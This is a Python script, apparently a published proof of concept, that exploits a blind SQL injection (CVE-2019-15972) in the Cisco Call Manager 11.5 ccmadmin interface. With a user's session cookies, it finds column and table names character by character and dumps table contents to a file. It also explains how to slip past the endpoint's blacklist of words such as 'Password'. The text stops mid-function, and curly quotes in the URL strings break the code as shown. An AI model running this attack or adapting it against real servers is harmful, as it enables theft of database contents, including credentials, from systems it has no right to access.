#!/usr/bin/python3
# Author - Ken Gannon of F-Secure
import requests
import time

print('Informix SQL Injection script for Cisco Call Manager 11.5. You must have access to https://<cucm_endpoint>/ccmadmin/')
print('(CVE-2019-15972)')
print('This script will do the following:')
print('[*] Count how many columns are in a specific table')
print('[*] Enumerate the names of each column')
print('[*] Dump the table to a file called "cisco_tableDump_<tableId>.txt"')
print('[*] This script relies on the "rowid" hidden column of the Informix SQL database, which can lead to 10s of thousands of rows since row IDs are not removed when a row is removed from the table')
print('[*] Also after submitting your cookies to this script, make sure you close all browsers that are using your submitted cookies')
print('[*] Finally, the endpoint may reject your request if the column name has a blacklisted word, such as “Password”, but this can be bypassed by URL encoding the word (such as proxying all traffic through Burp and URL encoding “password”)')
cookie1=input('Input your JSESSIONID cookie and press enter (if null then enter a random alphanumeric value): ')
cookie2=input('Input your com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY cookie and press enter: ')
cookie3=input('Input your JSESSIONIDSSO cookie and press enter (if null then enter a random alphanumeric value): ')
tableId=input('Input the "tabid" of the table you want to enumerate and press enter: ')
endpoint=input('Input the endpoint IP address or FQDN of the endpoint and press enter: ')
path = './cisco_tableDump_' + tableId + '.txt'

#refresh the cisco cookie
def refresh_cookie(cookie1, cookie2, cookie3):
	theRequest_url = "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=1=1&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true"
	theRequest_cookies = {"JSESSIONID": cookie1, "com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY": cookie2, "JSESSIONIDSSO": cookie3}
	theRequest_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
	response = requests.get(theRequest_url, headers=theRequest_headers, cookies=theRequest_cookies, verify=False)
	newCookie = response.headers['Set-Cookie']
	newCookie = newCookie[60:]
	newCookie = newCookie[:20]
	newCookie = newCookie.replace(";","")
	newCookie = newCookie.replace(" ","")
	newCookie = newCookie.replace("P","")
	newCookie = newCookie.replace("a","")
	newCookie = newCookie.replace("t","")
	newCookie = newCookie.replace("h","")
	return newCookie


def check_remaining_rows(cookie1, cookie2, cookie3, rowCounter, columnAnchor, tablename):

	cookie2 = refresh_cookie(cookie1, cookie2, cookie3)
	theRequest_url = "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=1=1%20AND%20(select%20%" + str(columnAnchor) + "%20from%20" + str(tablename) + "%20where%20rowid%20=%20" + str(rowCounter) + ")%20%3E%201&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&searchLimVal0=&lookup=true&rowsPerPage=50&searchLimVal9=&pageNumber=1&recCnt=0&multiple=true"
	theRequest_cookies = {"JSESSIONID": cookie1, "com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY": cookie2, "JSESSIONIDSSO": cookie3}
	theRequest_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true", "Content-Type": "application/x-www-form-urlencoded", "DNT": "1", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
	theRequest_data={"rowsPerPageControl": "/ccmadmin/userGroupFindList.do?lookup=true&multiple=true&whereClause=&rowsPerPage=50&pageNumber=1", "rowsVisible": "1", "primaryTable": "dirGroup", "dispCols": "pkid#name#minimumuserrank#isStandard", "searchField0": "name", "searchLimVal0": "beginsWith", "searchLimit0": "beginsWith", "searchString0": '', "searchField1": "name", "searchLimVal1": "beginsWith", "searchLimit1": "beginsWith", "searchString1": '', "searchField2": "name", "searchLimVal2": "beginsWith", "searchLimit2": "beginsWith", "searchString2": '', "searchField3": "name", "searchLimVal3": "beginsWith", "searchLimit3": "beginsWith", "searchString3": '', "searchField4": "name", "searchLimVal4": "beginsWith", "searchLimit4": "beginsWith", "searchString4": '', "searchField5": "name", "searchLimVal5": "beginsWith", "searchLimit5": "beginsWith", "searchString5": '', "searchField6": "name", "searchLimVal6": "beginsWith", "searchLimit6": "beginsWith", "searchString6": '', "searchField7": "name", "searchLimVal7": "beginsWith", "searchLimit7": "beginsWith", "searchString7": '', "searchField8": "name", "searchLimVal8": "beginsWith", "searchLimit8": "beginsWith", "searchString8": '', "searchField9": "name", "searchLimVal9": "beginsWith", "searchLimit9": "beginsWith", "searchString9": ''}
	response = requests.post(theRequest_url, headers=theRequest_headers, cookies=theRequest_cookies, data=theRequest_data, verify=False)
	responseLength = len(response.content)
	if responseLength > 60000:
		#more rows exist
		return "yay" + " " + cookie2
	else:
		return "boo" + " " + cookie2

def database_nCols(cookie1, cookie2, cookie3, tabId):
	#find the number of columns in a table
	numberOfColumns = 1
	while True:
		#verify if the character itself is correct
		cookie2 = refresh_cookie(cookie1, cookie2, cookie3)
		theRequest_url = "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=1=1%20AND%20(select%20ncols%20from%20systables%20where%20tabid%20=%20" + str(tabId) + ")%20=%20" + str(numberOfColumns) + "&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true"
		theRequest_cookies = {"JSESSIONID": cookie1, "com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY": cookie2, "JSESSIONIDSSO": cookie3}
		theRequest_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
		theRequest_data={"rowsPerPageControl": "/ccmadmin/userGroupFindList.do?lookup=true&multiple=true&whereClause=&rowsPerPage=50&pageNumber=1", "rowsVisible": "1", "primaryTable": "dirGroup", "dispCols": "pkid#name#minimumuserrank#isStandard", "searchField0": "name", "searchLimVal0": "beginsWith", "searchLimit0": "beginsWith", "searchString0": '', "searchField1": "name", "searchLimVal1": "beginsWith", "searchLimit1": "beginsWith", "searchString1": '', "searchField2": "name", "searchLimVal2": "beginsWith", "searchLimit2": "beginsWith", "searchString2": '', "searchField3": "name", "searchLimVal3": "beginsWith", "searchLimit3": "beginsWith", "searchString3": '', "searchField4": "name", "searchLimVal4": "beginsWith", "searchLimit4": "beginsWith", "searchString4": '', "searchField5": "name", "searchLimVal5": "beginsWith", "searchLimit5": "beginsWith", "searchString5": '', "searchField6": "name", "searchLimVal6": "beginsWith", "searchLimit6": "beginsWith", "searchString6": '', "searchField7": "name", "searchLimVal7": "beginsWith", "searchLimit7": "beginsWith", "searchString7": '', "searchField8": "name", "searchLimVal8": "beginsWith", "searchLimit8": "beginsWith", "searchString8": '', "searchField9": "name", "searchLimVal9": "beginsWith", "searchLimit9": "beginsWith", "searchString9": ''}
		response = requests.post(theRequest_url, headers=theRequest_headers, cookies=theRequest_cookies, data=theRequest_data, verify=False)
		responseLength = len(response.content)
		if responseLength > 60000:
			#number of columns found
			print("\n[*] number of columns: " + str(numberOfColumns) + "\n")
			return str(numberOfColumns) + " " + cookie2
		numberOfColumns = numberOfColumns + 1


def database_name(cookie1, cookie2, cookie3, tabId, nCols):
	#get column name
	asciiCharacter = 64
	asciiCounter = 1
	characterPosition = 1
	columnName = ""
	columnArray = []
	while nCols != 0:
		#verify if the character itself is correct
		cookie2 = refresh_cookie(cookie1, cookie2, cookie3)
		theRequest_url = "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=1=1%20AND%20(select%20ascii(substring(colname%20from%20" + str(characterPosition) + "%20for%201))%20FROM%20syscolumns%20where%20tabid%20=%20" + str(tabId) + "%20AND%20colno%20=%20" + str(nCols) + ")%20%3D%20" + str(asciiCharacter) + "&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true"
		theRequest_cookies = {"JSESSIONID": cookie1, "com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY": cookie2, "JSESSIONIDSSO": cookie3}
		theRequest_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
		theRequest_data={"rowsPerPageControl": "/ccmadmin/userGroupFindList.do?lookup=true&multiple=true&whereClause=&rowsPerPage=50&pageNumber=1", "rowsVisible": "1", "primaryTable": "dirGroup", "dispCols": "pkid#name#minimumuserrank#isStandard", "searchField0": "name", "searchLimVal0": "beginsWith", "searchLimit0": "beginsWith", "searchString0": '', "searchField1": "name", "searchLimVal1": "beginsWith", "searchLimit1": "beginsWith", "searchString1": '', "searchField2": "name", "searchLimVal2": "beginsWith", "searchLimit2": "beginsWith", "searchString2": '', "searchField3": "name", "searchLimVal3": "beginsWith", "searchLimit3": "beginsWith", "searchString3": '', "searchField4": "name", "searchLimVal4": "beginsWith", "searchLimit4": "beginsWith", "searchString4": '', "searchField5": "name", "searchLimVal5": "beginsWith", "searchLimit5": "beginsWith", "searchString5": '', "searchField6": "name", "searchLimVal6": "beginsWith", "searchLimit6": "beginsWith", "searchString6": '', "searchField7": "name", "searchLimVal7": "beginsWith", "searchLimit7": "beginsWith", "searchString7": '', "searchField8": "name", "searchLimVal8": "beginsWith", "searchLimit8": "beginsWith", "searchString8": '', "searchField9": "name", "searchLimVal9": "beginsWith", "searchLimit9": "beginsWith", "searchString9": ''}
		response = requests.post(theRequest_url, headers=theRequest_headers, cookies=theRequest_cookies, data=theRequest_data, verify=False)
		responseLength = len(response.content)
		if responseLength > 60000:
			#character was valid. move onto the next character
			print('[*] character found: ' + chr(asciiCharacter))
			columnName = columnName + chr(asciiCharacter)
			characterPosition = characterPosition + 1
			asciiCharacter = 64
			asciiCounter = 1
		else:
			#do the name enumeration
			cookie2 = refresh_cookie(cookie1, cookie2, cookie3)
			theRequest_url = "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=1=1%20AND%20(select%20ascii(substring(colname%20from%20" + str(characterPosition) + "%20for%201))%20FROM%20syscolumns%20where%20tabid%20=%20" + str(tabId) + "%20AND%20colno%20=%20" + str(nCols) + ")%20%3E%20" + str(asciiCharacter) + "&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true"
			theRequest_cookies = {"JSESSIONID": cookie1, "com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY": cookie2, "JSESSIONIDSSO": cookie3}
			theRequest_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
			theRequest_data={"rowsPerPageControl": "/ccmadmin/userGroupFindList.do?lookup=true&multiple=true&whereClause=&rowsPerPage=50&pageNumber=1", "rowsVisible": "1", "primaryTable": "dirGroup", "dispCols": "pkid#name#minimumuserrank#isStandard", "searchField0": "name", "searchLimVal0": "beginsWith", "searchLimit0": "beginsWith", "searchString0": '', "searchField1": "name", "searchLimVal1": "beginsWith", "searchLimit1": "beginsWith", "searchString1": '', "searchField2": "name", "searchLimVal2": "beginsWith", "searchLimit2": "beginsWith", "searchString2": '', "searchField3": "name", "searchLimVal3": "beginsWith", "searchLimit3": "beginsWith", "searchString3": '', "searchField4": "name", "searchLimVal4": "beginsWith", "searchLimit4": "beginsWith", "searchString4": '', "searchField5": "name", "searchLimVal5": "beginsWith", "searchLimit5": "beginsWith", "searchString5": '', "searchField6": "name", "searchLimVal6": "beginsWith", "searchLimit6": "beginsWith", "searchString6": '', "searchField7": "name", "searchLimVal7": "beginsWith", "searchLimit7": "beginsWith", "searchString7": '', "searchField8": "name", "searchLimVal8": "beginsWith", "searchLimit8": "beginsWith", "searchString8": '', "searchField9": "name", "searchLimVal9": "beginsWith", "searchLimit9": "beginsWith", "searchString9": ''}
			response = requests.post(theRequest_url, headers=theRequest_headers, cookies=theRequest_cookies, data=theRequest_data, verify=False)
			responseLength = len(response.content)
			if responseLength > 60000:
			#ascii character found
				asciiCharacter = asciiCharacter + (64 / (2**int(asciiCounter)))
				asciiCharacter = int(asciiCharacter)
				asciiCounter = asciiCounter + 1
			else:
			#ascii character not found
				asciiCharacter = asciiCharacter - (64 / (2**int(asciiCounter)))
				asciiCharacter = int(asciiCharacter)
				asciiCounter = asciiCounter + 1
			if asciiCharacter == 0:
				if len(columnName) < 1:
					nCols = int(nCols) - 1
					asciiCharacter = 64
					asciiCounter = 1
					characterPosition = 1
					columnName = ""
				else:
					print('[*] end of column, name: ' + columnName)
					print('[*] remaining columns: ' + str(int(nCols) - 1))
					#result = "column number: " + str(nCols) + " column name: " + columnName + "\n"
					#writeToFile = open(path,'a')
					#writeToFile.write(result)
					#writeToFile.close()
					columnArray.append(columnName)
					nCols = int(nCols) - 1
					asciiCharacter = 64
					asciiCounter = 1
					characterPosition = 1
					columnName = ""
	
	tableNameResult = get_table_name(cookie1, cookie2, cookie3, tableId)
	tableName, cookie2 = tableNameResult.split()

	dump_table(cookie1, cookie2, cookie3, columnArray, tableName)

def get_table_name(cookie1, cookie2, cookie3, tableId):
	asciiCharacter = 64
	asciiCounter = 1
	characterPosition = 1
	databaseName = ""
	while True:
		#verify if the character itself is correct
		cookie2 = refresh_cookie(cookie1, cookie2, cookie3)
		theRequest_url = "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=1=1%20AND%20(select%20ascii(substring(tabname%20from%20" + str(characterPosition) + "%20for%201))%20from%20systables%20where%20tabid%20=%20" + str(tableId) + ")%20%3D%20" + str(asciiCharacter) + "&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&searchLimVal0=&lookup=true&rowsPerPage=50&searchLimVal9=&pageNumber=1&recCnt=37&multiple=true"
		theRequest_cookies = {"JSESSIONID": cookie1, "com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY": cookie2, "JSESSIONIDSSO": cookie3}
		theRequest_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
		theRequest_data={"rowsPerPageControl": "/ccmadmin/userGroupFindList.do?lookup=true&multiple=true&whereClause=&rowsPerPage=50&pageNumber=1", "rowsVisible": "1", "primaryTable": "dirGroup", "dispCols": "pkid#name#minimumuserrank#isStandard", "searchField0": "name", "searchLimVal0": "beginsWith", "searchLimit0": "beginsWith", "searchString0": '', "searchField1": "name", "searchLimVal1": "beginsWith", "searchLimit1": "beginsWith", "searchString1": '', "searchField2": "name", "searchLimVal2": "beginsWith", "searchLimit2": "beginsWith", "searchString2": '', "searchField3": "name", "searchLimVal3": "beginsWith", "searchLimit3": "beginsWith", "searchString3": '', "searchField4": "name", "searchLimVal4": "beginsWith", "searchLimit4": "beginsWith", "searchString4": '', "searchField5": "name", "searchLimVal5": "beginsWith", "searchLimit5": "beginsWith", "searchString5": '', "searchField6": "name", "searchLimVal6": "beginsWith", "searchLimit6": "beginsWith", "searchString6": '', "searchField7": "name", "searchLimVal7": "beginsWith", "searchLimit7": "beginsWith", "searchString7": '', "searchField8": "name", "searchLimVal8": "beginsWith", "searchLimit8": "beginsWith", "searchString8": '', "searchField9": "name", "searchLimVal9": "beginsWith", "searchLimit9": "beginsWith", "searchString9": ''}

		response = requests.post(theRequest_url, headers=theRequest_headers, cookies=theRequest_cookies, data=theRequest_data, verify=False)
		responseLength = len(response.content)
		if responseLength > 60000:
			#character was valid. move onto the next character
			print('[*] character found: ' + chr(asciiCharacter))
			databaseName = databaseName + chr(asciiCharacter)
			characterPosition = characterPosition + 1
			asciiCharacter = 64
			asciiCounter = 1
		else:
			#do the name enumeration
			cookie2 = refresh_cookie(cookie1, cookie2, cookie3)
			theRequest_url = "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=1=1%20AND%20(select%20ascii(substring(tabname%20from%20" + str(characterPosition) + "%20for%201))%20from%20systables%20where%20tabid%20=%20" + str(tableId) + ")%20%3E%20" + str(asciiCharacter) + "&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&searchLimVal0=&lookup=true&rowsPerPage=50&searchLimVal9=&pageNumber=1&recCnt=37&multiple=true"
			theRequest_cookies = {"JSESSIONID": cookie1, "com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY": cookie2, "JSESSIONIDSSO": cookie3}
			theRequest_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
			theRequest_data={"rowsPerPageControl": "/ccmadmin/userGroupFindList.do?lookup=true&multiple=true&whereClause=&rowsPerPage=50&pageNumber=1", "rowsVisible": "1", "primaryTable": "dirGroup", "dispCols": "pkid#name#minimumuserrank#isStandard", "searchField0": "name", "searchLimVal0": "beginsWith", "searchLimit0": "beginsWith", "searchString0": '', "searchField1": "name", "searchLimVal1": "beginsWith", "searchLimit1": "beginsWith", "searchString1": '', "searchField2": "name", "searchLimVal2": "beginsWith", "searchLimit2": "beginsWith", "searchString2": '', "searchField3": "name", "searchLimVal3": "beginsWith", "searchLimit3": "beginsWith", "searchString3": '', "searchField4": "name", "searchLimVal4": "beginsWith", "searchLimit4": "beginsWith", "searchString4": '', "searchField5": "name", "searchLimVal5": "beginsWith", "searchLimit5": "beginsWith", "searchString5": '', "searchField6": "name", "searchLimVal6": "beginsWith", "searchLimit6": "beginsWith", "searchString6": '', "searchField7": "name", "searchLimVal7": "beginsWith", "searchLimit7": "beginsWith", "searchString7": '', "searchField8": "name", "searchLimVal8": "beginsWith", "searchLimit8": "beginsWith", "searchString8": '', "searchField9": "name", "searchLimVal9": "beginsWith", "searchLimit9": "beginsWith", "searchString9": ''}
			response = requests.post(theRequest_url, headers=theRequest_headers, cookies=theRequest_cookies, data=theRequest_data, verify=False)
			responseLength = len(response.content)
			if responseLength > 60000:
				#ascii character found
				asciiCharacter = asciiCharacter + (64 / (2**int(asciiCounter)))
				asciiCharacter = int(asciiCharacter)
				asciiCounter = asciiCounter + 1
			else:
			#ascii character not found
				asciiCharacter = asciiCharacter - (64 / (2**int(asciiCounter)))
				asciiCharacter = int(asciiCharacter)
				asciiCounter = asciiCounter + 1
			if asciiCharacter == 0:
				if len(databaseName) < 1:
					numberOfDatabases = int(numberOfDatabases) + 1
					asciiCharacter = 64
					asciiCounter = 1
					characterPosition = 1
					databaseName = ""
				else:
					print('[*] end of table, name: ' + databaseName)
					return databaseName + " " + cookie2


def dump_table(cookie1, cookie2, cookie3, columnArray, tableName):

	#start at rowId 1
	rowCounter = 1

	#start at the first column of the column array
	columnCounter = 0
	columnAnchor = columnArray[columnCounter]
	#establish the number of columns
	numberOfColumns = len(columnArray)
	asciiCharacter = 64
	asciiCounter = 1
	characterPosition = 1
	databaseName = ""
	while True:
		#check if rows still exist
		#remainingRowsResults = check_remaining_rows(cookie1, cookie2, cookie3, rowCounter, columnAnchor, tableName)
		#remainingRows, cookie2 = remainingRowsResults.split()
		#if "boo" in remainingRows:
		#	print("[*] no more rows")
		#	exit()
		while numberOfColumns != 0:
			#columns remain, time to enumerate each column and row
			cookie2 = refresh_cookie(cookie1, cookie2, cookie3)

			columnAnchor = columnArray[columnCounter]

			#check to see if the current ascii character is valid
			theRequest_url = "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=1=1%20AND%20(select%20ascii(substring("+ str(columnAnchor) +"%20from%20" + str(characterPosition) + "%20for%201))%20FROM%20" + (tableName) + "%20where%20rowid%20=%20" + str(rowCounter) + ")%20%3D%20" + str(asciiCharacter) + "&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=0&multiple=true"
			theRequest_cookies = {"JSESSIONID": cookie1, "com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY": cookie2, "JSESSIONIDSSO": cookie3}
			theRequest_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
			theRequest_data={"rowsPerPageControl": "/ccmadmin/userGroupFindList.do?lookup=true&multiple=true&whereClause=&rowsPerPage=50&pageNumber=1", "rowsVisible": "1", "primaryTable": "dirGroup", "dispCols": "pkid#name#minimumuserrank#isStandard", "searchField0": "name", "searchLimVal0": "beginsWith", "searchLimit0": "beginsWith", "searchString0": '', "searchField1": "name", "searchLimVal1": "beginsWith", "searchLimit1": "beginsWith", "searchString1": '', "searchField2": "name", "searchLimVal2": "beginsWith", "searchLimit2": "beginsWith", "searchString2": '', "searchField3": "name", "searchLimVal3": "beginsWith", "searchLimit3": "beginsWith", "searchString3": '', "searchField4": "name", "searchLimVal4": "beginsWith", "searchLimit4": "beginsWith", "searchString4": '', "searchField5": "name", "searchLimVal5": "beginsWith", "searchLimit5": "beginsWith", "searchString5": '', "searchField6": "name", "searchLimVal6": "beginsWith", "searchLimit6": "beginsWith", "searchString6": '', "searchField7": "name", "searchLimVal7": "beginsWith", "searchLimit7": "beginsWith", "searchString7": '', "searchField8": "name", "searchLimVal8": "beginsWith", "searchLimit8": "beginsWith", "searchString8": '', "searchField9": "name", "searchLimVal9": "beginsWith", "searchLimit9": "beginsWith", "searchString9": ''}
			response = requests.post(theRequest_url, headers=theRequest_headers, cookies=theRequest_cookies, data=theRequest_data, verify=False)
			responseLength = len(response.content)
			if responseLength > 60000:
				#character was valid. move onto the next character
				print('[*] character found: ' + chr(asciiCharacter))
				databaseName = databaseName + chr(asciiCharacter)
				characterPosition = characterPosition + 1
				asciiCharacter = 64
				asciiCounter = 1
			else:

				#do the name enumeration
				cookie2 = refresh_cookie(cookie1, cookie2, cookie3)
				theRequest_url = "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=1=1%20AND%20(select%20ascii(substring("+ str(columnAnchor) +"%20from%20" + str(characterPosition) + "%20for%201))%20FROM%20" + (tableName) + "%20where%20rowid%20=%20" + str(rowCounter) + ")%20%3E%20" + str(asciiCharacter) + "&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=0&multiple=true"
				theRequest_cookies = {"JSESSIONID": cookie1, "com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY": cookie2, "JSESSIONIDSSO": cookie3}
				theRequest_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
